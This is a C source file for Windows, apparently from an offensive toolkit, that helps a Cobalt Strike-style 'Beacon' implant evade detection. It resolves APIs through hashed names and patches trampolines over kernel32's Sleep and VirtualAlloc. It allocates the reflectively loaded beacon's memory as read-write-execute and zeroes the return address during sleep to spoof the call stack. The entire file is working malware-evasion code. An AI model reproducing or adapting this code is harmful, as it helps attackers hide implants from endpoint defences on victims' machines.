#include <Windows.h>
#include "Header.h"



#define TRAMPOLINESIZE	14


typedef unsigned char      uint8_t;
typedef unsigned int       uint32_t;
typedef unsigned long long uint64_t;

typedef struct _ReflectiveLdr {

	PVOID	pAddress;
	SIZE_T	Size;

}ReflectiveLdr, * PReflectiveLdr;


typedef struct _ConfigStruct {

	PVOID	SleepAddress;
	PVOID	VirtualAddress;
	PVOID	VirtualProtectAddress;

	BYTE	SleepOriginalBytes [TRAMPOLINESIZE];
	BYTE	VirtualOriginalBytes [TRAMPOLINESIZE];

	ULONG	SleepOriginalProtection;
	ULONG	VirtualOriginalProtection;
	
	BOOL	IsSleepHooked;
	BOOL	IsVirtualHooked;

	ReflectiveLdr Beacon;

}ConfigStruct, * PConfigStruct;

ConfigStruct BeaconSettings = { 0 };


typedef BOOL (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);

VOID InstallOriginalSetting(int FuncToRestore);
VOID InstallHooks(int FuncToHook);


BOOL InitializeBeaconConfig() {

	BeaconSettings.SleepAddress = (PVOID)GetProcAddressF(KERNEL32DLL_Rotr32, Sleep_Rotr32);
	BeaconSettings.VirtualAddress = (PVOID)GetProcAddressF(KERNEL32DLL_Rotr32, VirtualAlloc_Rotr32);
	BeaconSettings.VirtualProtectAddress = (PVOID)GetProcAddressF(KERNEL32DLL_Rotr32, VirtualProtect_Rotr32);
	
	if (BeaconSettings.SleepAddress == NULL || BeaconSettings.VirtualAddress == NULL || BeaconSettings.VirtualProtectAddress == NULL) {
		return FALSE;
	}

	return TRUE;
}


VOID __stdcall LocalSleep(DWORD dwMilliseconds) {

	if (BeaconSettings.IsSleepHooked == TRUE) {
		InstallOriginalSetting(SLEEPHOOK);
	}

	if (dwMilliseconds > 500) {
		PULONG_PTR overwrite = (PULONG_PTR)_AddressOfReturnAddress();
		const PULONG_PTR* origReturnAddress = *overwrite;
		*overwrite = 0;
		NtCreateTimer(BeaconSettings.Beacon.pAddress, BeaconSettings.Beacon.Size, dwMilliseconds);
		*overwrite = origReturnAddress;
	}

	if (BeaconSettings.IsSleepHooked == FALSE) {
		InstallHooks(SLEEPHOOK);
	}
}



PVOID __stdcall LocalVirualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	if (BeaconSettings.IsVirtualHooked == TRUE) {
		InstallOriginalSetting(VIRTUALALLOCHOOK);
	}

	LPVOID	RflctvAddress = NULL;
	DWORD	OldProtection = NULL;
	SIZE_T  dwSize2 = dwSize + 125;

	

	fnNtAllocateVirtualMemory NtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddressF(NTDLLDLL_Rotr32, NtAllocateVirtualMemory_Rotr32);
	if (!NT_SUCCESS((NtAllocateVirtualMemory(NtCurrentProcess(), &RflctvAddress, 0, &dwSize2, flAllocationType, PAGE_READONLY)))) {
		return NULL;
	}


	lpAddress = (PVOID)((ULONG_PTR)RflctvAddress + 125);
	
	
	fnNtProtectVirtualMemory NtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddressF(NTDLLDLL_Rotr32, NtProtectVirtualMemory_Rotr32);
	if (!NT_SUCCESS((NtProtectVirtualMemory(NtCurrentProcess(), &lpAddress, &dwSize, PAGE_EXECUTE_READWRITE, &OldProtection)))) {
		return NULL;
	}


	BeaconSettings.Beacon.pAddress = RflctvAddress;
	BeaconSettings.Beacon.Size = dwSize;

	return lpAddress;

}


VOID InstallHooks(int FuncToHook) {
	
	fnVirtualProtect pVirtualProtect = (fnVirtualProtect)BeaconSettings.VirtualProtectAddress;

	uint8_t trampoline[] = {
		0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x41, 0xFF, 0xE2                                            
	};

	switch (FuncToHook) {
		case SLEEPHOOK: {
			uint64_t addr = (uint64_t)(&LocalSleep);
			CP2(&trampoline[2], &addr, sizeof(addr));
			pVirtualProtect(BeaconSettings.SleepAddress, TRAMPOLINESIZE, PAGE_EXECUTE_READWRITE, &BeaconSettings.SleepOriginalProtection);
			CP2(BeaconSettings.SleepOriginalBytes, BeaconSettings.SleepAddress, TRAMPOLINESIZE);
			CP2(BeaconSettings.SleepAddress, trampoline, TRAMPOLINESIZE);
			BeaconSettings.IsSleepHooked = TRUE;
			break;
		}

		case VIRTUALALLOCHOOK: {
			uint64_t addr = (uint64_t)(&LocalVirualAlloc);
			CP2(&trampoline[2], &addr, sizeof(addr));
			pVirtualProtect(BeaconSettings.VirtualAddress, TRAMPOLINESIZE, PAGE_EXECUTE_READWRITE, &BeaconSettings.VirtualOriginalProtection);
			CP2(BeaconSettings.VirtualOriginalBytes, BeaconSettings.VirtualAddress, TRAMPOLINESIZE);
			CP2(BeaconSettings.VirtualAddress, trampoline, TRAMPOLINESIZE);
			BeaconSettings.IsVirtualHooked = TRUE;
			break;
		}
	}
}


VOID InstallOriginalSetting(int FuncToRestore){
	
	DWORD		OldProtection	= NULL;
	fnVirtualProtect pVirtualProtect = (fnVirtualProtect)BeaconSettings.VirtualProtectAddress;

	switch (FuncToRestore) {
		case SLEEPHOOK: {
			CP2(BeaconSettings.SleepAddress, BeaconSettings.SleepOriginalBytes, TRAMPOLINESIZE);
			pVirtualProtect(BeaconSettings.SleepAddress, TRAMPOLINESIZE, BeaconSettings.SleepOriginalProtection, &OldProtection);
			BeaconSettings.IsSleepHooked = FALSE;
			break;
		}

		case VIRTUALALLOCHOOK: {
			CP2(BeaconSettings.VirtualAddress, BeaconSettings.VirtualOriginalBytes, TRAMPOLINESIZE);
			pVirtualProtect(BeaconSettings.VirtualAddress, TRAMPOLINESIZE, BeaconSettings.VirtualOriginalProtection, &OldProtection);
			BeaconSettings.IsVirtualHooked = FALSE;
			break;
		}
	}
}